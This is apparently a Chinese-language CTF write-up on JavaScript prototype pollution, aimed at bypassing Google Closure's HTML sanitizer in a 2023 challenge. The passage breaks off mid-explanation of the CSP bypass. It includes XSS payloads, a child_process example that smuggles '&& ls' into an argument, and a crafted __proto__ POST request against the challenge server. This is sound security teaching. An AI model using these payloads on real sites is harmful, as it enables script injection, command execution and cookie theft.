<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> name=<span class="string">&#x27;test&#x27;</span></span><br><span class="line">name.</span><br></pre></td></tr></table></figure>
<p>在 console 裡使用 <code>name.</code> 時（打到 <code>.</code> 就好），這時候瀏覽器會很貼心的幫我們列出所有存在 <code>name</code> 本身的屬性或方法：<br>這裡看到的清單，是 <code>name</code> 的原型物件裡所有可用的屬性與方法，當你呼叫這些方法時，JavaScript 會透過原型鏈查找到可用的函式。</p>
<p><img src="img/GoogleCTFCSP_1.png" alt="Untitled"></p>
<p>它們是如何搜尋使用的方法及屬性的?</p>
<p>比如在調用 <code>toLowerCase</code> </p>
<ol>
<li>查看 <code>name</code> 本身是否有<code>toLowerCase</code> 方法，發現 <code>name</code> 本身沒這方法</li>
<li>到 <code>name prototypal</code> 找，也就是 <code>String.prototype</code> ，在這邊會找到<code>toLowerCase</code> 的方法</li>
<li>根據 <code>String.prototype.toLowerCase</code>的函式設計，執行 <code>name.toLowerCase()</code></li>
</ol>
<p>如果去調用不存在的方法比如 <code>name.abc()</code>，他會一直向上找到 <code>null</code>為止，並回傳相關錯誤，這就是<strong>prototype chain</strong></p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">name &gt; <span class="title class_">String</span>.<span class="property"><span class="keyword">prototype</span></span> &gt; <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span> &gt; <span class="literal">null</span></span><br><span class="line">       <span class="title function_">toLowerCase</span>()        <span class="title function_">toString</span>()</span><br><span class="line">       <span class="title function_">slice</span>()              <span class="title function_">hasOwnProperty</span>()</span><br><span class="line">       <span class="title function_">split</span>()              <span class="title function_">isPrototypeOf</span>()</span><br><span class="line">       ...                  ...</span><br></pre></td></tr></table></figure>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Person 是一個構造函式</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"><span class="comment">// 透過 Person 構造函式，創建了一個 personA 對象</span></span><br><span class="line"><span class="keyword">const</span> personA = <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"></span><br><span class="line">personA.<span class="property">__proto__</span> === <span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>; <span class="comment">// true</span></span><br><span class="line">personA.<span class="property">__proto__</span>.<span class="property">__proto__</span>.<span class="property">__proto__</span> === <span class="literal">null</span>; <span class="comment">//prototype chain</span></span><br></pre></td></tr></table></figure>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> human = &#123;</span><br><span class="line">    <span class="attr">action</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;eat&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> man = <span class="title class_">Object</span>.<span class="title function_">create</span>(human)<span class="comment">//man擁有的human的屬性</span></span><br><span class="line">man.<span class="title function_">action</span>() #=&gt; eat</span><br></pre></td></tr></table></figure>
<p>使用<strong>proto</strong>訪問物件的原型</p>
<p>每個物件都有特殊的屬性，你可以使用該屬性訪問其原型。</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> human = &#123;</span><br><span class="line">    <span class="attr">action</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;eat&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> man = <span class="title class_">Object</span>.<span class="title function_">create</span>(human)</span><br><span class="line"><span class="keyword">const</span> woman = <span class="title class_">Object</span>.<span class="title function_">create</span>(human)</span><br><span class="line">man.<span class="property">__proto__</span> === woman.<span class="property">__proto__</span> #=&gt; <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>可以使用括弧或點表示法進行訪問：<code>__proto__</code></p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">username.<span class="property">__proto__</span></span><br><span class="line">username[<span class="string">&#x27;__proto__&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>可以將參考連結到原型鏈上：<strong>proto</strong></p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">username.<span class="property">__proto__</span>                        <span class="comment">// String.prototype</span></span><br><span class="line">username.<span class="property">__proto__</span>.<span class="property">__proto__</span>              <span class="comment">// Object.prototype</span></span><br><span class="line">username.<span class="property">__proto__</span>.<span class="property">__proto__</span>.<span class="property">__proto__</span>    <span class="comment">// null</span></span><br></pre></td></tr></table></figure>
<p>由於原型繼承，所有字串都可以訪問此方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let searchTerm = &quot;  example &quot;;</span><br><span class="line">searchTerm.removeWhitespace();    // &quot;example&quot;</span><br></pre></td></tr></table></figure>
<h3 id="What-is-prototype-pollution"><a href="#What-is-prototype-pollution" class="headerlink" title="What is prototype pollution?"></a><strong>What is prototype pollution?</strong></h3><p>它允許攻擊者控制原本無法訪問的對象的屬性。如果應用程式隨後以不安全的方式處理攻擊者控制的屬性，則可能會與其他漏洞連結。在用戶端 JavaScript 中，這通常會導致 <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/dom-based">DOM XSS，</a>而伺服器端原型污染甚至會導致RCE。</p>
<p>攻擊者可能會使用包含有害值的屬性污染原型，這些屬性隨後可能被應用程式以危險的方式使用。</p>
<p>任何原型物件都可能受到污染，但這種情況最常發生在<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/prototype-pollution/javascript-prototypes-and-inheritance#the-prototype-chain">內置的全域 <code>Object.prototype</code></a> 中。</p>
<p>成功利用原型污染需要以下關鍵元件：</p>
<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/prototype-pollution#prototype-pollution-sources">A prototype pollution source</a> </p>
<ul>
<li>任何使用者可控的輸入，可用於向原型物件添加任意屬性</li>
<li><p><strong>Prototype pollution via the URL</strong></p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://vulnerable-website.com/?__proto__[evilProperty]=payload</span><br><span class="line">                              ||</span><br><span class="line">                              \/</span><br><span class="line">          targetObject.__proto__.evilProperty = &#x27;payload&#x27;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>注入的重點不僅僅是名稱，更重要的是攻擊者可以利用此技術來注入具有實際影響的屬性，從而對應用程式或庫進行攻擊</li>
<li>攻擊者可以利用相同的技術來注入與應用程式或庫中已存在的屬性相同名稱的屬性，從而污染原型</li>
<li>這樣的注入可能會影響到應用程式或庫的行為，因為它們可能會使用這些屬性來執行特定的功能或操作</li>
</ul>
</li>
<li><p><strong>Prototype pollution via JSON input</strong></p>
  <figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;__proto__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;evilProperty&quot;</span>: <span class="string">&quot;payload&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>使用者可控制的 JSON 輸入也可用於污染原型。</li>
<li>JSON.parse() 將 JSON 物件中的任何鍵視為任意字串，包括<strong><strong>proto</strong></strong></li>
<li><p>例如，如果攻擊者註入<strong>{“<strong>proto</strong>“: {“evilProperty”: “payload”}}<strong>proto</strong></strong>，則產生的物件將具有帶有 key 的屬性</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> objectLiteral = &#123;<span class="attr">__proto__</span>: &#123;<span class="attr">evilProperty</span>: <span class="string">&#x27;payload&#x27;</span>&#125;&#125;;</span><br><span class="line"><span class="keyword">const</span> objectFromJson = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;: &#123;&quot;evilProperty&quot;: &quot;payload&quot;&#125;&#125;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">objectLiteral.<span class="title function_">hasOwnProperty</span>(<span class="string">&#x27;__proto__&#x27;</span>);     <span class="comment">// false</span></span><br><span class="line">objectFromJson.<span class="title function_">hasOwnProperty</span>(<span class="string">&#x27;__proto__&#x27;</span>);    <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>如果在沒有適當的按鍵清理的情況下將該物件合併到現有物件中，則可能會導致分配期間的原型污染。</p>
</li>
</ul>
</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/prototype-pollution#prototype-pollution-sinks">A sink</a> </p>
<ul>
<li><strong>Prototype pollution sinks</strong></li>
<li>本質上只是一個 JavaScript 函數或 DOM 元素，您可以通過原型污染訪問它，這使您能夠執行任意 JavaScript 或系統命令</li>
</ul>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 先假設可以污染原型上的屬性</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;img src=x onerror=alert(1)&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 底下都跟剛剛一樣</span></span><br><span class="line"><span class="keyword">var</span> qs = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(location.<span class="property">search</span>.<span class="title function_">slice</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(<span class="title function_">createElement</span>(&#123;</span><br><span class="line">  <span class="attr">tag</span>: <span class="string">&#x27;h2&#x27;</span>,</span><br><span class="line">  <span class="attr">innerText</span>: <span class="string">`Search result for <span class="subst">$&#123;qs.get(<span class="string">&#x27;q&#x27;</span>)&#125;</span>`</span></span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createElement</span>(<span class="params">config</span>)&#123;</span><br><span class="line">  <span class="keyword">const</span> element = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(config.<span class="property">tag</span>)</span><br><span class="line">  <span class="comment">// 這一行因為原型鏈被污染，所以 if(config.innerHTML) 的結果會是 true</span></span><br><span class="line">  <span class="keyword">if</span> (config.<span class="property">innerHTML</span>) &#123;</span><br><span class="line">    element.<span class="property">innerHTML</span> = config.<span class="property">innerHTML</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    element.<span class="property">innerText</span> = config.<span class="property">innerText</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> element</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>當我們假設可以污染原型並將 <strong>Object.prototype.innerHTML</strong> 設置為 <strong><code>&lt;img src=x onerror=alert(1)&gt;</code></strong> 時，無論 <strong>config</strong> 物件是否提供 <strong>innerHTML</strong> 屬性，該屬性都會被視為存在且為真值</li>
<li>這是因為 JavaScript 在檢查物件屬性時，會在原型鏈上查找，即使 <strong>config</strong> 物件本身沒有該屬性，它的原型鏈上有一個非空的 <strong>innerHTML</strong> 屬性，因此被視為真值。</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/prototype-pollution#prototype-pollution-gadgets">An exploitable gadget</a> </p>
<ul>
<li>只要污染了 prototype，就可以拿來利用的程式碼」叫做 script gadget</li>
<li><a target="_blank" rel="noopener" href="https://github.com/BlackFan/client-side-prototype-pollution">https://github.com/BlackFan/client-side-prototype-pollution</a></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/sanitize-html/1.27.5/sanitize-html.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">innerText</span> = <span class="string">&#x27;&lt;svg onload=alert(1)&gt;&lt;/svg&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="title function_">sanitizeHtml</span>(<span class="string">&#x27;&lt;div&gt;hello&lt;/div&gt;&#x27;</span>))</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>在污染了 <code>Object.prototype.innerText</code> 之後，就觸發了XSS</li>
</ul>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> child_process = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> params = [<span class="string">&#x27;123 &amp;&amp; ls&#x27;</span>]</span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">shell</span> = <span class="literal">true</span> <span class="comment">// 只多了這行，參數的解析就會不一樣</span></span><br><span class="line"><span class="keyword">const</span> result = child_process.<span class="title function_">spawnSync</span>(</span><br><span class="line">  <span class="string">&#x27;echo&#x27;</span>, params, &#123;<span class="attr">timeout</span>: <span class="number">1000</span>&#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result.<span class="property">stdout</span>.<span class="title function_">toString</span>())</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">123</span></span><br><span class="line"><span class="comment">index.js</span></span><br><span class="line"><span class="comment">node_modules</span></span><br><span class="line"><span class="comment">package-lock.json</span></span><br><span class="line"><span class="comment">package.json</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li><code>child_process.spawn</code> 的第三個參數 options 中有一個選項叫做 <code>shell</code>，設為 true 以後會造成行為不同<ul>
<li>參考這文件 : <a target="_blank" rel="noopener" href="https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options">https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options</a></li>
</ul>
</li>
<li>透過 prototype pollution 搭配 script gadget（<code>child_process.spawn</code>），成功製造出一個嚴重性極高的漏洞。</li>
</ul>
<p>回歸正題，目標應該是在網站中找到一個XSS漏洞並竊取cookie拿到flag</p>
<p>在打開網頁後可以看到這樣的畫面，我們需要對其輸入一些資訊，介紹欄位是插入到頁面中的文字</p>
<p><img src="img/GoogleCTFCSP_2.png" alt="Untitled"></p>
<p>不過這受到Google自己的 Closure Library 的保護，免受 XSS 攻擊</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/google/closure-library">https://github.com/google/closure-library</a></li>
</ul>
<p>那目標就是繞過這些XSS保護得到XSS漏洞</p>
<p>通過查看頁面的程式碼</p>
<p>使用了 <strong>unsafe.alsoAllowTags()</strong> 方法，這個方法的作用是允許特定的 HTML 標籤，其中包括了 <strong><code>&lt;IFRAME&gt;</code></strong> 標籤。註釋中提到 “IFRAME is required for Youtube embed”，暗示了這段程式碼的目的是為了嵌入 YouTube 影片而允許 <strong><code>&lt;IFRAME&gt;</code></strong> 標籤</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="title class_">Const</span> = goog.<span class="property">string</span>.<span class="property">Const</span>;</span><br><span class="line">  <span class="keyword">var</span> unsafe = goog.<span class="property">html</span>.<span class="property">sanitizer</span>.<span class="property">unsafe</span>;</span><br><span class="line">  <span class="keyword">var</span> builder = <span class="keyword">new</span> goog.<span class="property">html</span>.<span class="property">sanitizer</span>.<span class="property">HtmlSanitizer</span>.<span class="title class_">Builder</span>();</span><br><span class="line">  builder = unsafe.<span class="title function_">alsoAllowTags</span>(</span><br><span class="line">      <span class="title class_">Const</span>.<span class="title function_">from</span>(<span class="string">&#x27;IFRAME is required for Youtube embed&#x27;</span>), builder, [<span class="string">&#x27;IFRAME&#x27;</span>]);</span><br><span class="line">  sanitizer = unsafe.<span class="title function_">alsoAllowAttributes</span>(</span><br><span class="line">      <span class="title class_">Const</span>.<span class="title function_">from</span>(<span class="string">&#x27;iframe#src is required for Youtube embed&#x27;</span>), builder,</span><br><span class="line">      [</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="attr">tagName</span>: <span class="string">&#x27;iframe&#x27;</span>,</span><br><span class="line">        <span class="attr">attributeName</span>: <span class="string">&#x27;src&#x27;</span>,</span><br><span class="line">        <span class="attr">policy</span>: <span class="function">(<span class="params">s</span>) =&gt;</span> s.<span class="title function_">startsWith</span>(<span class="string">&#x27;https://&#x27;</span>) ? s : <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">      ]).<span class="title function_">build</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>那前面提到的原型汙染問題出現在哪裡呢?</p>
<p>先來了解一下 <code>Object.assign()</code> </p>
<ul>
<li><code>Object.assign()</code> 方法將源物件的可列舉屬性（enumerable properties）複製到目標物件。它只複製物件自身的屬性，不包括原型鏈上的屬性</li>
<li>這就意味著 <code>Object.assign()</code> 不會複製源物件的原型（<code>__proto__</code>）到目標物件的原型</li>
<li>如果目標物件本身是一個具有原型（即 <code>__proto__</code>）的物件，<code>Object.assign()</code> 會直接修改目標物件的原型，而不是在目標物件本身上添加屬性</li>
</ul>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">//不受原型汙染影響</span></span><br><span class="line"><span class="keyword">let</span> testobj = &#123;<span class="string">&quot;a&quot;</span>:<span class="number">1</span>, <span class="string">&quot;b&quot;</span>:<span class="number">2</span>&#125;</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>(testobj, <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;polluted&quot;: &quot;true&quot;&#125;&#125;&#x27;</span>))</span><br><span class="line">testobj.<span class="property">polluted</span> === <span class="literal">undefined</span> <span class="comment">//testobj屬性不包含polluted屬性，所以testobj.polluted的值是undefined</span></span><br></pre></td></tr></table></figure>
<ul>
<li>將 <code>testobj.__proto__</code>（即 <code>testobj</code> 的原型）作為目標集，使用 <code>Object.assign()</code> 方法將具有屬性 <code>&quot;polluted&quot;: true</code> 的物件合併到 <code>testobj</code> 的原型中</li>
<li>因為 <code>testobj</code> 的原型被直接修改，所以這將導致原型污染。現在，任何通過 testobj 繼承的物件都會具有 <code>&quot;polluted&quot;: true</code> 屬性</li>
<li><code>testobj.polluted</code>的值將是 <code>true</code></li>
</ul>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">//受原型汙染影響</span></span><br><span class="line"><span class="keyword">let</span> testobj = &#123;<span class="string">&quot;a&quot;</span>:<span class="number">1</span>, <span class="string">&quot;b&quot;</span>:<span class="number">2</span>&#125;</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>(testobj.[<span class="string">&quot;__proto__&quot;</span>], <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;polluted&quot;: true&#125;&#x27;</span>))</span><br><span class="line">testobj.<span class="property">polluted</span> === <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>讓我們來看一下該網頁的原始碼</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">interestObj = &#123;<span class="string">&quot;favorites&quot;</span>:&#123;&#125;&#125;;</span><br><span class="line">  <span class="keyword">const</span> uuid = viewPath[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">  xhr.<span class="title function_">addEventListener</span>(<span class="string">&quot;load&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (xhr.<span class="property">status</span> === <span class="number">200</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> json = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(xhr.<span class="property">response</span>);</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">of</span> <span class="title class_">Object</span>.<span class="title function_">keys</span>(json)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (interestObj[key] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">          interestObj[key] = json[key];</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="title class_">Object</span>.<span class="title function_">assign</span>(interestObj[key], json[key]);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="title function_">alert</span>(xhr.<span class="property">response</span>);</span><br><span class="line">      location.<span class="property">href</span> = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">`/bio/<span class="subst">$&#123;uuid&#125;</span>`</span>, <span class="literal">false</span>);</span><br><span class="line">  xhr.<span class="title function_">send</span>();</span><br></pre></td></tr></table></figure>
<ol>
<li>在遍歷 JSON 物件時，會將每個屬性添加到 <strong>interestObj</strong> 中。如果 <strong>interestObj</strong> 已經有了相同的屬性，則使用 <strong>Object.assign()</strong> 方法將來自 JSON 物件的值合併到已有的物件中。這包括了 <strong><strong>proto</strong></strong> 屬性。</li>
<li>由於 <strong><strong>proto</strong></strong> 是一個特殊的屬性，它是物件的原型。在這段程式碼中，當 <strong><strong>proto</strong></strong> 屬性存在於 JSON 物件中時，<strong>Object.assign()`</strong> 方法將直接修改 <strong>interestObj</strong> 的原型，而不是在 <strong>interestObj</strong> 本身上添加屬性。</li>
<li>這樣一來，<strong>interestObj</strong> 的原型就被成功地污染了，使得全局作用域中的變量可以被修改。這種原型污染漏洞可能導致安全風險，因為攻擊者可以利用它來修改全局作用域中的變量，進而影響應用程式的行為。</li>
<li>使用者控制的資料：這裡的關鍵元素是 <code>xhr.response</code>。它有雙重目的：<ol>
<li>對 <code>/bio/&lt;UUID&gt;</code> 的 GET 請求的回應正文，檢索使用者設定檔資訊。</li>
<li>傳送至 <code>/bio/&lt;UUID&gt;/create</code> 的 POST 請求的回應正文，用於建立新設定檔。</li>
</ol>
</li>
<li>攻擊向量：攻擊者可以透過向 <code>/create</code> 端點建構惡意 POST 請求來操縱 <code>xhr.response</code>。這涉及在設定檔資料 (json) 中包含 <code>&quot;proto&quot;: &#123;&quot;polluted&quot;: true&#125;</code></li>
</ol>
<p>在這種表單輸入的題目，使用者可以自行控制內容，可以通過向目標頁面發送POST請求，去創建內容</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">curl <span class="string">&#x27;https://biohazard-web.2023.ctfcompetition.com/create&#x27;</span> \</span><br><span class="line">  -X <span class="variable constant_">POST</span> \</span><br><span class="line">  -H <span class="string">&#x27;content-type: application/json&#x27;</span> \</span><br><span class="line">  --data-raw <span class="string">&#x27;&#123;&quot;name&quot;:&quot;test&quot;,&quot;introduction&quot;:&quot;&quot;,&quot;favorites&quot;:&#123;&quot;hobbies&quot;:&quot;&quot;,&quot;sports&quot;:&quot;&quot;&#125;, &quot;__proto__&quot;: &#123;&quot;polluted&quot;: true&#125;&#125;&#x27;</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">//&#123;&quot;id&quot;:&quot;1025c907-69b7-4b3e-a756-c0413c4643d8&quot;&#125;   </span></span><br><span class="line"></span><br><span class="line">------------------------------</span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/create&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>:<span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  <span class="attr">headers</span>: &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">body</span>: <span class="string">`&#123;&quot;name&quot;:&quot;test&quot;,&quot;introduction&quot;:&quot;&quot;,&quot;favorites&quot;:&#123;&quot;hobbies&quot;:&quot;&quot;,&quot;sports&quot;:&quot;&quot;&#125;, &quot;__proto__&quot;: &#123;&quot;polluted&quot;: true&#125;&#125;`</span></span><br><span class="line">&#125;);                                                                                                                                    </span><br></pre></td></tr></table></figure>
<ul>
<li><p>Exploit Sequence</p>
<ul>
<li>攻擊者控制的 <code>xhr.response</code> 被解析為 JavaScript 物件 ( <strong>json</strong>)。</li>
<li><p>程式碼使用 <code>Object.keys()</code> 迭代 json 中的<strong>KEY</strong>。這包括「name」、「introduction」、「favorites」和關鍵的「proto」</p>
  <figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">interestObj[key] = json[key]</span><br></pre></td></tr></table></figure>
</li>
<li><p>由於 <code>interestObj</code>已經擁有自己的原型，遇到「<strong>proto</strong>」不會觸發<strong>if block</strong> （<code>interestObj[“proto”]</code>不會是未定義的）。</p>
</li>
<li><p>因此，<strong>else block</strong> 執行，使用 <code>Object.assign</code> 將 <code>json[&quot;proto&quot;]</code> 合併到 <code>interestObj[&quot;proto&quot;]</code> 中。</p>
  <figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>(interestObj[key], json[key])</span><br></pre></td></tr></table></figure>
</li>
<li><p>關鍵在於 <code>json[&quot;proto&quot;]</code> 是攻擊者精心製作的數據，其中包含 {“polluted”: true} 屬性。</p>
</li>
<li>合併後， <code>interestObj[&quot;proto&quot;]</code>  成為攻擊者控制的具有污染屬性的原型物件。</li>
</ul>
</li>
</ul>
<p>前面有提到，這題使用 <strong>Google Closure 保護網頁不受XSS危害</strong></p>
<p>那如何bypass <strong>Google Closure?</strong></p>
<p><a target="_blank" rel="noopener" href="https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:~:text=mychallenge.-,Closure,-ClosureSanitizerhas">Prototype pollution - and bypassing client-side HTML sanitizers - research.securitum.com</a> 在查看了這網站後得到了啟發</p>
<p>Closure sanitizer 使用的是白名單，這檔案可以 <a target="_blank" rel="noopener" href="https://github.com/google/closure-library/blob/master/closure/goog/html/sanitizer/attributeallowlists.js">https://github.com/google/closure-library/blob/master/closure/goog/html/sanitizer/attributeallowlists.js</a> 在這查看到</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">AllowedAttributes</span> = &#123;</span><br><span class="line"><span class="comment">//&#x27;* ATTRIBUTE_NAME&#x27;: true,</span></span><br><span class="line">  <span class="string">&#x27;* ARIA-CHECKED&#x27;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="string">&#x27;* ARIA-COLCOUNT&#x27;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="string">&#x27;* ARIA-COLINDEX&#x27;</span>: <span class="literal">true</span>,</span><br><span class="line">  ...</span><br><span class="line">  <span class="string">&#x27;* VALUE&#x27;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="string">&#x27;* VSPACE&#x27;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="string">&#x27;* WIDTH&#x27;</span>: <span class="literal">true</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">exports</span>.<span class="property">AllowedAttributes</span> = <span class="title class_">AllowedAttributes</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>AllowedAttributes</code> Object<ul>
<li>該物件充當字典，其中鍵代表 HTML 標記名稱和屬性名稱的組合。</li>
<li>每個key均遵循格式 <code>* TAG_NAME ATTRIBUTE_NAME</code></li>
<li>星號 (*) 可能表示該規則適用於 <code>TAG_NAME</code> 的任何值</li>
<li>與每個key關聯的值是一個布林值（true）</li>
<li>指定 tag 允許使用相應的 attribute</li>
</ul>
</li>
</ul>
<p>通過添加到 create POST 請求中來注入新的標籤和屬性</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="title class_">AllowedAttributes</span>&#123;<span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;TAG_NAME ATTRIBUTE_NAME&quot;</span>: <span class="literal">true</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>這樣就可以繞過 Closure sanitizer，但還需要繞CSP，但可能就會有人想，都繞過了 Closure sanitizer為何還要繞CSP</p>
<ul>
<li>Closure sanitizer的作用：<ul>
